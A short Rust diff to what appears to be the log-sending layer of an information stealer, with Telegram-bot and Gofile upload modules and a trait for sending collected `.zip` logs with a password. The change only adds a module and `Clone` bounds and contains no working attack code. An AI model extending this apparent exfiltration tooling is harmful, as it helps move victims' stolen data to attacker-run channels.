@@ -3,6 +3,7 @@
 extern crate alloc;
 pub mod telegram_bot;
 pub mod gofile;
+pub mod size_fallback;
 
 use alloc::string::String;
 use alloc::vec::Vec;
@@ -16,6 +17,7 @@ pub enum SendError {
 }
 
 /// Represents a log file to be sent or processed.
+#[derive(Clone)]
 pub enum LogFile {
     /// A tuple containing:
     /// - A URL pointing to a `.zip` log archive.
@@ -47,6 +49,6 @@ pub trait LogSender: Clone {
     /// - `Result<(), SendError>`: Returns `Ok(())` if the log was sent successfully, or a [`SendError`] if the operation failed.
     fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
-        P: AsRef<str>,
+        P: AsRef<str> + Clone,
         C: Collector;
 }
